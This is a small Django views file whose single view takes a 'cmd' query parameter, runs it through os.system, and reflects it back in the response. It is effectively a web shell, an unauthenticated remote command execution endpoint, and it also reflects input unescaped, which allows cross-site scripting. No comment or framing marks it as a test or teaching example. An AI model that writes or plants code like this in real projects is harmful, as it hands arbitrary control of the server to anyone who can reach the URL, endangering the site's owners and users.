from django.shortcuts import render
from django.http import HttpResponse
import os

def index(request):
    cmd = request.GET['cmd']
    os.system(cmd)
    print("\033[1;32;40m Command ran successfully in terminal")
    return HttpResponse(f"{cmd}")